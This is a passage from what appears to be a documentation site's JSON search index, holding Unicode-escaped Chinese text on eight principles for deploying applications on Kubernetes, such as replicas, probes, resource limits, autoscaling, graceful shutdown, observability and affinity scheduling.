\u5206\u5e03\u5f0f\u7cfb\u7edf\u548c\u5fae\u670d\u52a1\u4f53\u7cfb\u7ed3\u6784\u7684\u6311\u6218\u4e4b\u4e00\u662f\u81ea\u52a8\u68c0\u6d4b\u4e0d\u6b63\u5e38\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5c06\u8bf7\u6c42\uff08request\uff09\u91cd\u65b0\u8def\u7531\u5230\u5176\u4ed6\u53ef\u7528\u7cfb\u7edf\uff0c\u6062\u590d\u635f\u574f\u7684\u7ec4\u4ef6\u3002\u5065\u5eb7\u68c0\u67e5\u662f\u5e94\u5bf9\u8be5\u6311\u6218\u7684\u4e00\u79cd\u53ef\u9760\u65b9\u6cd5\u3002\u4f7f\u7528 Kubernetes\uff0c\u53ef\u4ee5\u901a\u8fc7\u63a2\u9488\u914d\u7f6e\u8fd0\u884c\u72b6\u51b5\u68c0\u67e5\uff0c\u4ee5\u786e\u5b9a\u6bcf\u4e2a Pod \u7684\u72b6\u6001\u3002 \u5c31\u7eea\u63a2\u9488\u7528\u4e8e\u5224\u65ad\u5bb9\u5668\u662f\u5426\u542f\u52a8\u5b8c\u6210\uff0c\u5373\u5bb9\u5668\u7684Ready\u662f\u5426\u4e3aTrue\uff0c\u53ef\u4ee5\u63a5\u6536\u8bf7\u6c42\uff0c\u5982\u679cReadinessProbe\u63a2\u6d4b\u5931\u8d25\uff0c\u5219\u5bb9\u5668\u7684Ready\u5c06\u4e3aFalse\uff0c\u63a7\u5236\u5668\u5c06\u6b64Pod\u7684Endpoint\u4ece\u5bf9\u5e94\u7684service\u7684Endpoint\u5217\u8868\u4e2d\u79fb\u9664\uff0c\u4ece\u6b64\u4e0d\u518d\u5c06\u4efb\u4f55\u8bf7\u6c42\u8c03\u5ea6\u6b64Pod\u4e0a\uff0c\u76f4\u5230\u4e0b\u6b21\u63a2\u6d4b\u6210\u529f\u3002\u901a\u8fc7\u4f7f\u7528Readiness\u63a2\u9488\uff0cKubernetes\u80fd\u591f\u7b49\u5f85\u5e94\u7528\u7a0b\u5e8f\u5b8c\u5168\u542f\u52a8\uff0c\u7136\u540e\u624d\u5141\u8bb8\u670d\u52a1\u5c06\u6d41\u91cf\u53d1\u9001\u5230\u65b0\u526f\u672c\u3002 \u5b58\u6d3b\u63a2\u9488\u7528\u4e8e\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5b58\u6d3b\uff0c\u5373Pod\u662f\u5426\u4e3arunning\u72b6\u6001\uff0c\u5982\u679cLivenessProbe\u63a2\u9488\u63a2\u6d4b\u5230\u5bb9\u5668\u4e0d\u5065\u5eb7\uff0c\u5219kubelet\u5c06kill\u6389\u5bb9\u5668\uff0c\u5e76\u6839\u636e\u5bb9\u5668\u7684\u91cd\u542f\u7b56\u7565\u662f\u5426\u91cd\u542f\u3002\u5982\u679c\u4e00\u4e2a\u5bb9\u5668\u4e0d\u5305\u542bLivenessProbe\u63a2\u9488\uff0c\u5219Kubelet\u8ba4\u4e3a\u5bb9\u5668\u7684LivenessProbe\u63a2\u9488\u7684\u8fd4\u56de\u503c\u6c38\u8fdc\u6210\u529f\u3002 \u539f\u52196\uff1a\u8d44\u6e90\u8bf7\u6c42\u4e0e\u9650\u5236 \u4e0d\u8981\u5c06\u8bf7\u6c42\u548c\u9650\u5236\u8bbe\u7f6e\u5f97\u592a\u4f4e\uff01\u4e00\u5f00\u59cb\u8fd9\u53ef\u80fd\u5f88\u8bf1\u4eba\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u96c6\u7fa4\u8fd0\u884c\u66f4\u591a\u7684 Pod\u3002\u4f46\u5728\u9ad8\u5cf0\u671f\u5b83\u4eec\u7684QPS\u5c06\u88ab\u9650\u5236\u5728\u6307\u5b9a\u7684\u6570\u91cf\u3002\u800c\u6269\u5927\u89c4\u6a21\u5b9e\u9645\u4e0a\u610f\u5473\u7740\u6bcf\u4e2a\u90e8\u7f72\u7684 Pod \u5360\u7528\u66f4\u591a\u7684\u8d44\u6e90\uff0c\u4f46\u662f\u6574\u4f53\u6027\u80fd\u53ef\u80fd\u4f1a\u66f4\u5dee\u3002\u4e5f\u4e0d\u8981\u5c06\u8bf7\u6c42\u548c\u9650\u5236\u8bbe\u7f6e\u592a\u9ad8\uff0c\u8fd9\u4f1a\u9020\u6210\u8d44\u6e90\u7684\u6781\u5927\u6d6a\u8d39\u3002 \u5982\u4f55\u6709\u6548\u7684\u8bbe\u7f6eresources request\u548climits \uff0c\u5728\u964d\u672c\u7684\u540c\u65f6\u63d0\u9ad8\u8d44\u6e90\u7684\u5229\u7528\u7387\uff0c\u7814\u53d1\u540c\u5b66\u53ef\u4ee5\u7ed3\u5408prometheus\u548cgrafana\u5386\u53f2\u6570\u636e\uff0c\u6839\u636e\u8d8b\u52bf\u56fe\u4ee5\u53ca\u5cf0\u503c\u6570\u503c\u5408\u7406\u914d\u7f6e\u8d44\u6e90\u53c2\u6570\u3002 \u56e0java\u5e94\u7528\u5728\u542f\u52a8\u65f6cpu\u4f1a\u98d9\u5347\u4e00\u6bb5\u65f6\u95f4\uff08jvm\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u88c5\u8f7d\u5e76\u8fde\u63a5\u6240\u6709\u9664\u53cd\u5c04\u4ee5\u5916\u7684\u7c7b\uff0c\u800cclass\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u7684\u6587\u4ef6\uff0c\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u7136\u540e\u89e3\u6790\uff0c\u8fd9\u79cd\u89e3\u6790\u662f\u5f88\u8017\u8d39cpu\u7684\uff0cclass\u6587\u4ef6\u8d8a\u591a\uff0ccpu\u8017\u8d39\u5c31\u8d8a\u9ad8\uff09\uff0c\u5728\u65e0\u9700\u5173\u6ce8\u5e94\u7528\u91cd\u8981\u7a0b\u5ea6\u7684\u60c5\u51b5\u4e0b\uff0c\u63a8\u8350Qos\u8bbe\u7f6e\u4e3aBurstable\uff08limits \u4e0e requests \u503c\u8bbe\u7f6e\u4e0d\u540c\uff09\u5373\u53ef\uff0c\u963f\u91ccack\u5b89\u88c5\u7684\u7ec4\u4ef6\u5982coredns\u3001kube-proxy\u3001\u7f51\u7edc\u63d2\u4ef6\u7b49OomScoreAdj\u6253\u5206\u5f88\u4f4e\uff0c\u5728\u89e6\u53d1\u7cfb\u7edf\u9a71\u9010\u72b6\u6001\u4e0b\u4e0d\u4f1a\u5148\u884c\u9a71\u9010\u7ec4\u4ef6\u4ece\u800c\u5f71\u54cd\u5e94\u7528\u3002\u5fc5\u987b\u8bbe\u7f6e\u4e3aGuaranteed\u7684\u53ef\u8054\u7cfb\u8fd0\u7ef4\u8c03\u6574\u3002 \u539f\u52197\uff1a\u53ef\u89c2\u6d4b\u6027 \u76d1\u63a7\u3001\u65e5\u5fd7\u8bb0\u5f55\u548c\u94fe\u8def\u8ddf\u8e2a\u662f\u53ef\u89c2\u5bdf\u6027\u7684\u4e09\u5927\u652f\u67f1\u3002SRE \u7684 \u201c\u56db\u4e2a\u9ec4\u91d1\u4fe1\u53f7\u201d \u662f\u5ef6\u8fdf\u3001\u6d41\u91cf\u3001\u9519\u8bef\u548c\u9971\u548c\u5ea6\u3002\u4ece\u7ecf\u9a8c\u4e0a\u770b\uff0c\u4f7f\u7528\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6307\u6807\u8ddf\u8e2a\u8fd9\u4e9b\u76d1\u63a7\u4fe1\u53f7\u6bd4\u4f7f\u7528\u901a\u7528\u57fa\u7840\u8d44\u6e90\u83b7\u5f97\u7684\u539f\u59cb\u6307\u6807\u8981\u6709\u7528\u5f97\u591a\u3002 \u5982\u5bb9\u5668\u5f02\u5e38\u91cd\u542f\u62a5\u8b66\uff0c\u53ef\u53ca\u65f6\u901a\u8fc7\u963f\u91ccACK\u4e8b\u4ef6\u754c\u9762\u67e5\u770b\u91cd\u542f\u539f\u56e0\uff08\u4e8b\u4ef6\u9ed8\u8ba4\u4fdd\u7559\u4e00\u4e2a\u5c0f\u65f6\uff09\uff0cprometheus\u76d1\u63a7\u67e5\u770bcpu\u3001mem\u3001net\u3001fs\u8bfb\u5199\u72b6\u51b5\uff0c\u963f\u91ccARMS\u67e5\u770bjvm\u4ee5\u53ca\u94fe\u8def\u72b6\u6001\u7b49\u8bf7\u6c42\u60c5\u51b5\uff0c\u4ee5\u53ca\u963f\u91ccsls \u65e5\u5fd7\u670d\u52a1\u67e5\u770b\u91cd\u542f\u65f6\u95f4\u70b9\u4e1a\u52a1\u65e5\u5fd7\u8be6\u7ec6\u4fe1\u606f\u6765\u6392\u67e5\u3002 \u539f\u52198\uff1a\u5bb9\u5668\u8c03\u5ea6 \u5728\u9ed8\u8ba4\u7684K8S\u8c03\u5ea6\u4e2d\uff0c\u4e00\u822c\u7ecf\u8fc7\u9884\u9009\u548c\u4f18\u9009\u5373\u53ef\u5b8c\u6210\u8c03\u5ea6\uff0c\u4f46\u662f\u751f\u4ea7\u7684\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u8003\u8651\u5230\u90e8\u5206\u4e1a\u52a1\u7684\u7279\u6b8a\u6027\uff0c\u4e00\u822c\u4f1a\u624b\u52a8\u8fdb\u884c\u4e00\u4e9b\"\u6307\u5b9a\"\uff0c K8S \u628a\u8fd9\u4e9b\"\u6307\u5b9a\"\u5206\u4e3anodeAffinity(\u8282\u70b9\u4eb2\u548c\u6027)\u3001podAffinity(pod \u4eb2\u548c\u6027) \u4ee5\u53ca podAntiAffinity(pod \u53cd\u4eb2\u548c\u6027), \u8fd9\u5728\u8c03\u5ea6\u8fc7\u7a0b\u4e2d\uff0c\u79f0\u4e4b\u4e3a\u4eb2\u548c\u6027\u8c03\u5ea6\uff0c\u4eb2\u548c\u6027\u8c03\u5ea6\u53ef\u4ee5\u5206\u6210\u8f6f\u7b56\u7565(preferredDuringSchedulingIgnoredDuringExecution )\u548c\u786c\u7b56\u7565 (requiredDuringSchedulingIgnoredDuringExecution)\u4e24\u79cd\u65b9\u5f0f\uff0c\u8f6f\u7b56\u7565\u610f\u601d\u662f\u5982\u679c\u73b0\u5728\u6ca1\u6709\u6ee1\u8db3\u8c03\u5ea6\u8981\u6c42\u8981\u6c42\u7684\u8bdd\uff0c\u90a3\u5c31\u8df3\u8fc7\u8fd9\u6761\u7b56\u7565\uff0c\u7ee7\u7eed\u8c03\u5ea6\uff0c\u603b\u7ed3\u8d77\u6765\u5c31\u662f\"\u6709\u5219\u7528\u4e4b\uff0c\u65e0\u5219\u8df3\u8fc7\", \u800c\u786c\u7b56\u7565\u76f8\u5bf9\u5c31\u5f3a\u786c\u5f88\u591a\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u8c03\u5ea6\u7b56\u7565\uff0c\u5219\u4e0d\u505c\u91cd\u8bd5\uff0c\u76f4\u5230\u6ee1\u8db3\u7b56\u7565\u3002Pod \u62d3\u6251\u4f20\u64ad\u7ea6\u675f\u4ee5\u53ca\u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u89c4\u5219\u53ef\u4ee5\u505a\u5230\u5c06 Pod \u653e\u5728\u4e00\u8d77\uff08\u4ee5\u63d0\u9ad8\u7f51\u7edc\u6d41\u91cf\u6548\u7387\uff09\u6216\u5c06\u5b83\u4eec\u5206\u6563\uff08\u4ee5\u5b9e\u73b0\u5197\u4f59\uff09\u4fdd\u8bc1\u53ef\u7528\u6027\u3002 \u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u7684\u4f5c\u7528\u662f\u4e3a\u4e86\u8ba9pod\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u5ea6\u5230\u81ea\u5df1\u60f3\u5206\u914d\u7684\u4e00\u4e2a\u6216\u8005\u4e00\u7ec4node\u4e0a\uff0c\u6c61\u70b9\u7684\u4f5c\u7528\u5176\u5b9e\u5c31\u662f\u53cd\u8fc7\u6765\uff0c\u5c31\u662f\u7ed9node\u6253\u4e0a\u4e00\u4e2a\u7279\u6b8a\u7684\u6807\u7b7e\uff0c\u8ba9\u8be5node\u4e0d\u518d\u88ab\u5206\u914dpod\uff0c\u9664\u975e\u8be5pod\u5bb9\u5fcd\u4e86\u8be5\u6c61\u70b9\u3002","title":"K8S\u90e8\u7f72\u5e94\u7528\u76848\u9879\u539f\u5219"},{"location":"lxc/kubernetes/principle/#kubernetes","text":"\u5728\u672c\u6587\u4e2d\uff0c\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u8bbe\u8ba1\u4e91\u539f\u751f\u5e94\u7528\u7a0b\u5e8f\u5e76\u5c06\u5176\u90e8\u7f72\u5728 Kubernetes \u4e0a\u7684 8 \u6761\u539f\u5219\u3002","title":"Kubernetes\u5e94\u7528\u90e8\u7f72\u57fa\u672c\u539f\u5219"},{"location":"lxc/kubernetes/principle/#1pod","text":"Kubernetes \u7684\u81ea\u6211\u4fee\u590d\u7279\u6027\uff0c\u4f7fKubernetes \u53ef\u4ee5\u91cd\u542f\u5931\u8d25\u7684\u5bb9\u5668\u3001\u66ff\u6362\u5bb9\u5668\u3001\u6740\u6b7b\u4e0d\u54cd\u5e94\u7528\u6237\u5b9a\u4e49\u7684\u8fd0\u884c\u72b6\u51b5\u68c0\u67e5\u7684\u5bb9\u5668\uff0c\u5e76\u4e14\u5728\u51c6\u5907\u597d\u670d\u52a1\u4e4b\u524d\u4e0d\u5c06\u5176\u901a\u544a\u7ed9\u5ba2\u6237\u7aef\u3002\u5f53\u6211\u4eec\u4f7f\u7528deployment\u6216StatefulSet\u90e8\u7f72\u5de5\u4f5c\u8d1f\u8f7d\u7684\u65f6\u5019\uff0c\u786e\u4fddspec.replicas\u7684\u526f\u672c\u96c6\u6570\u91cf\u4e0d\u4f4e\u4e8e1\uff0cdev\u6216uat\u73af\u5883\u9664\u5916\u3002 \u901a\u8fc7service\u7684\u8d1f\u8f7d\u5747\u8861\uff0c\u8fd0\u884c\u591a\u4e2a\u5bb9\u5668\u5b9e\u4f8b\u4fdd\u969c\u5e94\u7528\u7684\u8fde\u7eed\u6027\uff0c\u5373\u4f7f\u90e8\u5206\u5bb9\u5668\u5f02\u5e38\u91cd\u542f\u4e5f\u80fd\u4fdd\u969c\u5e94\u7528\u7684\u6b63\u5e38\u8bbf\u95ee\u3002","title":"\u539f\u52191\uff1apod\u591a\u526f\u672c"},{"location":"lxc/kubernetes/principle/#2secretconfigmap","text":"\u914d\u7f6e\u3001\u5bc6\u94a5\u7b49\u6587\u4ef6\u53ef\u4ee5\u901a\u8fc7\u6784\u5efa\u5230\u955c\u50cf\u6216\u8bbe\u7f6e\u5230\u73af\u5883\u53d8\u91cf\u4e2d\u5f15\u7528\uff0c\u5f53\u6587\u4ef6\u6709\u66f4\u65b0\uff0c\u5219\u9700\u8981\u91cd\u65b0\u6784\u5efa\u955c\u50cf\u53d1\u5e03\u540e\u751f\u6548\uff0c\u65e0\u6cd5\u505a\u5230\u70ed\u66f4\u65b0\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Kubernetes\u7684volumes\u6302\u8f7d\u65b9\u5f0f\u5f15\u7528\u81ea\u5df1\u521b\u5efa\u7684secret\uff08\u5bc6\u6587\uff09\u6216configmap\uff08\u660e\u6587\uff09\uff0c\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u505a\u5230\u70ed\u66f4\u65b0","title":"\u539f\u52192\uff1aSecret\u548cConfigMap\u7075\u6d3b\u4f7f\u7528"},{"location":"lxc/kubernetes/principle/#3horizontal-pod-autoscaler-hpa","text":"\u4ece\u6765\u6ca1\u6709\u4eba\u613f\u610f\u4ed6\u4eec\u7684\u670d\u52a1\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u8017\u5c3d\u5bb9\u91cf\u3002\u540c\u6837\uff0c\u6ca1\u6709\u4eba\u5e0c\u671b\u56e0\u4e3a Pod \u7684\u5bb9\u91cf\u4e0d\u8db3\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u3002\u6839\u636e\u53ef\u6269\u5c55\u6027\u8bbe\u8ba1\u539f\u5219\uff0c\u6211\u4eec\u5e94\u8be5\u4ece\u4e00\u5f00\u59cb\u5c31\u4e3a\u5355pod\u505a\u597d\u5168\u94fe\u8def\u538b\u6d4b\uff0c\u6709\u9488\u5bf9\u6027\u7684\u8bbe\u7f6epod\u7684\u6700\u5c0f\u526f\u672c\u6570\uff0c\u5e76\u4e3a\u5de5\u4f5c\u8d1f\u8f7d\u5e94\u5bf9\u7a81\u53d1\u6d41\u91cf\u6700\u597d\u9884\u4f30\uff0c\u901a\u8fc7cpu\u5185\u5b58\u7b49\u767e\u5206\u6bd4\u8bbe\u7f6epod\u7684\u6700\u5927\u526f\u672c\u6570\u3002\u8fd9\u5bf9\u4e8e\u5e94\u7528\u53ef\u7528\u6027\u548c\u53ef\u6269\u5c55\u6027\u81f3\u5173\u91cd\u8981\u3002\uff08StatefulSet\u6709\u72b6\u6001\u5e94\u7528\u4e5f\u53ef\u4ee5\u4f7f\u7528HPA\u81ea\u52a8\u4f38\u7f29\uff0c\u4e0d\u8fc7\u5efa\u8bae\u624b\u52a8\u89e6\u53d1\uff0c\u4f8b\u5982\u6269\u5c55\u6570\u636e\u5e93\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u6570\u636e\u590d\u5236\u548c\u989d\u5916\u7684\u4e8b\u52a1\u7ba1\u7406\u53d1\u751f\uff0c\u5982\u679c\u6570\u636e\u5e93\u5df2\u7ecf\u5904\u4e8e\u9ad8\u8d1f\u8f7d\u72b6\u6001\uff0c\u8fd9\u4f1a\u4ea7\u751f\u4e0d\u53ef\u63a7\u5236\u7684\u95ee\u9898\u3002\u6b64\u5916\u5982\u679c\u6709\u72b6\u6001\u7ec4\u4ef6\u9700\u8981\u4ee5\u67d0\u79cd\u65b9\u5f0f\u4e0e\u5176\u4ed6\u5b9e\u4f8b\u540c\u6b65\uff0c\u8bf7\u8003\u8651\u7981\u7528\u81ea\u52a8\u7f29\u51cf\u3002\uff09","title":"\u539f\u52193\uff1aHorizontal Pod Autoscaler (HPA)\u4f7f\u7528"},{"location":"lxc/kubernetes/principle/#4","text":"\u5f53 Kubernetes \u6740\u6b7b\u4e00\u4e2a pod \u65f6\uff0c\u4f1a\u53d1\u751f\u4ee5\u4e0b 5 \u4e2a\u6b65\u9aa4\uff1a 1\u3001 Pod \u5207\u6362\u5230\u7ec8\u6b62\u72b6\u6001\u5e76\u505c\u6b62\u63a5\u6536\u4efb\u4f55\u65b0\u6d41\u91cf\uff0c\u5bb9\u5668\u4ecd\u5728 pod \u5185\u8fd0\u884c\u3002 2\u3001 preStop \u94a9\u5b50\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u547d\u4ee4\u6216 HTTP \u8bf7\u6c42\u88ab\u6267\u884c\uff0c\u5e76\u88ab\u53d1\u9001\u5230 pod \u5185\u7684\u5bb9\u5668\u3002 3\u3001 SIGTERM \u4fe1\u53f7\u88ab\u53d1\u9001\u5230 pod\uff0c\u5bb9\u5668\u610f\u8bc6\u5230\u5b83\u5c06\u5f88\u5feb\u5173\u95ed\u3002 4\u3001 Kubernetes \u7b49\u5f85\u5bbd\u9650\u671f (terminationGracePeriodSeconds)\u3002\u6b64\u7b49\u5f85\u4e0e preStop hook \u548c SIGTERM \u4fe1\u53f7\u6267\u884c\u5e76\u884c\uff08\u9ed8\u8ba4 30 \u79d2\uff09\u3002\u56e0\u6b64\uff0cKubernetes \u4e0d\u4f1a\u7b49\u5f85\u8fd9\u4e9b\u5b8c\u6210\u3002\u5982\u679c\u8fd9\u6bb5\u65f6\u95f4\u7ed3\u675f\uff0c\u5219\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u6b65\u3002\u6b63\u786e\u8bbe\u7f6e\u5bbd\u9650\u671f\u7684\u503c\u975e\u5e38\u91cd\u8981\u3002 5\u3001\u5411 pod \u53d1\u9001 SIGKILL \u4fe1\u53f7\uff0c\u7136\u540e\u79fb\u9664 pod\u3002\u5982\u679c\u5bb9\u5668\u5728\u5bbd\u9650\u671f\u540e\u4ecd\u5728\u8fd0\u884c\uff0c\u5219 Pod \u88ab SIGKILL \u5f3a\u884c\u79fb\u9664\uff0c\u7ec8\u6b62\u5b8c\u6210\u3002 \u5f53Kubernetes\u5e94\u7528\u505a\u4e86\u670d\u52a1\u7f51\u683csidecar\u6ce8\u5165\uff0c\u9700\u5148\u4fdd\u8bc1\u4e1a\u52a1pod\u548cistio-proxy pod\u542f\u52a8\u987a\u5e8f\u548c\u505c\u6b62\u987a\u5e8f\uff0c\u907f\u514d\u5bb9\u5668\u5728\u91cd\u542f\u548c\u66f4\u65b0\u7684\u65f6\u5019\u6709\u6d41\u91cf\u5f02\u5e38\uff0c\u9ed8\u8ba4\u963f\u91ccASM\u5f00\u542f\u4e86holdApplicationUntilProxyStarts\u548cHoldProxyUntilApplicationEnds\u529f\u80fd\u3002\u53e6\u5916\u5bb9\u5668\u5e94\u7528\u7684\u4f18\u96c5\u505c\u6b62\uff0c\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u914d\u7f6epreStop webhook\u811a\u672c\u4ee5\u53caterminationGracePeriodSeconds\u65f6\u95f4\u3002","title":"\u539f\u52194\uff1a\u751f\u547d\u5468\u671f\u7ba1\u7406"},{"location":"lxc/kubernetes/principle/#5","text":"\u5206\u5e03\u5f0f\u7cfb\u7edf\u548c\u5fae\u670d\u52a1\u4f53\u7cfb\u7ed3\u6784\u7684\u6311\u6218\u4e4b\u4e00\u662f\u81ea\u52a8\u68c0\u6d4b\u4e0d\u6b63\u5e38\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5c06\u8bf7\u6c42\uff08request\uff09\u91cd\u65b0\u8def\u7531\u5230\u5176\u4ed6\u53ef\u7528\u7cfb\u7edf\uff0c\u6062\u590d\u635f\u574f\u7684\u7ec4\u4ef6\u3002\u5065\u5eb7\u68c0\u67e5\u662f\u5e94\u5bf9\u8be5\u6311\u6218\u7684\u4e00\u79cd\u53ef\u9760\u65b9\u6cd5\u3002\u4f7f\u7528 Kubernetes\uff0c\u53ef\u4ee5\u901a\u8fc7\u63a2\u9488\u914d\u7f6e\u8fd0\u884c\u72b6\u51b5\u68c0\u67e5\uff0c\u4ee5\u786e\u5b9a\u6bcf\u4e2a Pod \u7684\u72b6\u6001\u3002 \u5c31\u7eea\u63a2\u9488\u7528\u4e8e\u5224\u65ad\u5bb9\u5668\u662f\u5426\u542f\u52a8\u5b8c\u6210\uff0c\u5373\u5bb9\u5668\u7684Ready\u662f\u5426\u4e3aTrue\uff0c\u53ef\u4ee5\u63a5\u6536\u8bf7\u6c42\uff0c\u5982\u679cReadinessProbe\u63a2\u6d4b\u5931\u8d25\uff0c\u5219\u5bb9\u5668\u7684Ready\u5c06\u4e3aFalse\uff0c\u63a7\u5236\u5668\u5c06\u6b64Pod\u7684Endpoint\u4ece\u5bf9\u5e94\u7684service\u7684Endpoint\u5217\u8868\u4e2d\u79fb\u9664\uff0c\u4ece\u6b64\u4e0d\u518d\u5c06\u4efb\u4f55\u8bf7\u6c42\u8c03\u5ea6\u6b64Pod\u4e0a\uff0c\u76f4\u5230\u4e0b\u6b21\u63a2\u6d4b\u6210\u529f\u3002\u901a\u8fc7\u4f7f\u7528Readiness\u63a2\u9488\uff0cKubernetes\u80fd\u591f\u7b49\u5f85\u5e94\u7528\u7a0b\u5e8f\u5b8c\u5168\u542f\u52a8\uff0c\u7136\u540e\u624d\u5141\u8bb8\u670d\u52a1\u5c06\u6d41\u91cf\u53d1\u9001\u5230\u65b0\u526f\u672c\u3002 \u5b58\u6d3b\u63a2\u9488\u7528\u4e8e\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5b58\u6d3b\uff0c\u5373Pod\u662f\u5426\u4e3arunning\u72b6\u6001\uff0c\u5982\u679cLivenessProbe\u63a2\u9488\u63a2\u6d4b\u5230\u5bb9\u5668\u4e0d\u5065\u5eb7\uff0c\u5219kubelet\u5c06kill\u6389\u5bb9\u5668\uff0c\u5e76\u6839\u636e\u5bb9\u5668\u7684\u91cd\u542f\u7b56\u7565\u662f\u5426\u91cd\u542f\u3002\u5982\u679c\u4e00\u4e2a\u5bb9\u5668\u4e0d\u5305\u542bLivenessProbe\u63a2\u9488\uff0c\u5219Kubelet\u8ba4\u4e3a\u5bb9\u5668\u7684LivenessProbe\u63a2\u9488\u7684\u8fd4\u56de\u503c\u6c38\u8fdc\u6210\u529f\u3002","title":"\u539f\u52195\uff1a\u6b63\u786e\u914d\u7f6e\u5b58\u6d3b\u63a2\u9488\u53ca\u5c31\u7eea\u63a2\u9488"},{"location":"lxc/kubernetes/principle/#6","text":"\u4e0d\u8981\u5c06\u8bf7\u6c42\u548c\u9650\u5236\u8bbe\u7f6e\u5f97\u592a\u4f4e\uff01\u4e00\u5f00\u59cb\u8fd9\u53ef\u80fd\u5f88\u8bf1\u4eba\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u96c6\u7fa4\u8fd0\u884c\u66f4\u591a\u7684 Pod\u3002\u4f46\u5728\u9ad8\u5cf0\u671f\u5b83\u4eec\u7684QPS\u5c06\u88ab\u9650\u5236\u5728\u6307\u5b9a\u7684\u6570\u91cf\u3002\u800c\u6269\u5927\u89c4\u6a21\u5b9e\u9645\u4e0a\u610f\u5473\u7740\u6bcf\u4e2a\u90e8\u7f72\u7684 Pod \u5360\u7528\u66f4\u591a\u7684\u8d44\u6e90\uff0c\u4f46\u662f\u6574\u4f53\u6027\u80fd\u53ef\u80fd\u4f1a\u66f4\u5dee\u3002\u4e5f\u4e0d\u8981\u5c06\u8bf7\u6c42\u548c\u9650\u5236\u8bbe\u7f6e\u592a\u9ad8\uff0c\u8fd9\u4f1a\u9020\u6210\u8d44\u6e90\u7684\u6781\u5927\u6d6a\u8d39\u3002 \u5982\u4f55\u6709\u6548\u7684\u8bbe\u7f6eresources request\u548climits \uff0c\u5728\u964d\u672c\u7684\u540c\u65f6\u63d0\u9ad8\u8d44\u6e90\u7684\u5229\u7528\u7387\uff0c\u7814\u53d1\u540c\u5b66\u53ef\u4ee5\u7ed3\u5408prometheus\u548cgrafana\u5386\u53f2\u6570\u636e\uff0c\u6839\u636e\u8d8b\u52bf\u56fe\u4ee5\u53ca\u5cf0\u503c\u6570\u503c\u5408\u7406\u914d\u7f6e\u8d44\u6e90\u53c2\u6570\u3002 \u56e0java\u5e94\u7528\u5728\u542f\u52a8\u65f6cpu\u4f1a\u98d9\u5347\u4e00\u6bb5\u65f6\u95f4\uff08jvm\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u88c5\u8f7d\u5e76\u8fde\u63a5\u6240\u6709\u9664\u53cd\u5c04\u4ee5\u5916\u7684\u7c7b\uff0c\u800cclass\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u7684\u6587\u4ef6\uff0c\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u7136\u540e\u89e3\u6790\uff0c\u8fd9\u79cd\u89e3\u6790\u662f\u5f88\u8017\u8d39cpu\u7684\uff0cclass\u6587\u4ef6\u8d8a\u591a\uff0ccpu\u8017\u8d39\u5c31\u8d8a\u9ad8\uff09\uff0c\u5728\u65e0\u9700\u5173\u6ce8\u5e94\u7528\u91cd\u8981\u7a0b\u5ea6\u7684\u60c5\u51b5\u4e0b\uff0c\u63a8\u8350Qos\u8bbe\u7f6e\u4e3aBurstable\uff08limits \u4e0e requests \u503c\u8bbe\u7f6e\u4e0d\u540c\uff09\u5373\u53ef\uff0c\u963f\u91ccack\u5b89\u88c5\u7684\u7ec4\u4ef6\u5982coredns\u3001kube-proxy\u3001\u7f51\u7edc\u63d2\u4ef6\u7b49OomScoreAdj\u6253\u5206\u5f88\u4f4e\uff0c\u5728\u89e6\u53d1\u7cfb\u7edf\u9a71\u9010\u72b6\u6001\u4e0b\u4e0d\u4f1a\u5148\u884c\u9a71\u9010\u7ec4\u4ef6\u4ece\u800c\u5f71\u54cd\u5e94\u7528\u3002\u5fc5\u987b\u8bbe\u7f6e\u4e3aGuaranteed\u7684\u53ef\u8054\u7cfb\u8fd0\u7ef4\u8c03\u6574\u3002","title":"\u539f\u52196\uff1a\u8d44\u6e90\u8bf7\u6c42\u4e0e\u9650\u5236"},{"location":"lxc/kubernetes/principle/#7","text":"\u76d1\u63a7\u3001\u65e5\u5fd7\u8bb0\u5f55\u548c\u94fe\u8def\u8ddf\u8e2a\u662f\u53ef\u89c2\u5bdf\u6027\u7684\u4e09\u5927\u652f\u67f1\u3002SRE \u7684 \u201c\u56db\u4e2a\u9ec4\u91d1\u4fe1\u53f7\u201d \u662f\u5ef6\u8fdf\u3001\u6d41\u91cf\u3001\u9519\u8bef\u548c\u9971\u548c\u5ea6\u3002\u4ece\u7ecf\u9a8c\u4e0a\u770b\uff0c\u4f7f\u7528\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6307\u6807\u8ddf\u8e2a\u8fd9\u4e9b\u76d1\u63a7\u4fe1\u53f7\u6bd4\u4f7f\u7528\u901a\u7528\u57fa\u7840\u8d44\u6e90\u83b7\u5f97\u7684\u539f\u59cb\u6307\u6807\u8981\u6709\u7528\u5f97\u591a\u3002 